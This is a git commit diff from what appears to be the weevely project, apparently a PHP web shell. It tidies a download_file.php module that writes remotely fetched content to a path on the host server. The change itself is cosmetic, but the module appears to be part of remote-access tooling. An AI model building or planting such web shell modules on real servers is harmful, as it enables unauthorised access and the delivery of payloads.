64e3053b808203eeffb2a95757d1d8a568b2f498
sattacarlo <sattacarlo@5205769a-2ae6-11df-b744-258d51847b74>
2010-03-09 22:46:35 +0000

    Creazione Moduli
    git-svn-id: http://weevely.googlecode.com/svn/trunk@27 5205769a-2ae6-11df-b744-258d51847b74

--- modules/download_file.php
+++ modules/download_file.php
@@ -1,18 +1,2 @@
 $c = explode(' ', $r[1]);
-echo file_put_contents($c[1], file_get_contents($c[0]))."\n"
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+echo file_put_contents($c[1], file_get_contents($c[0]))."\n";
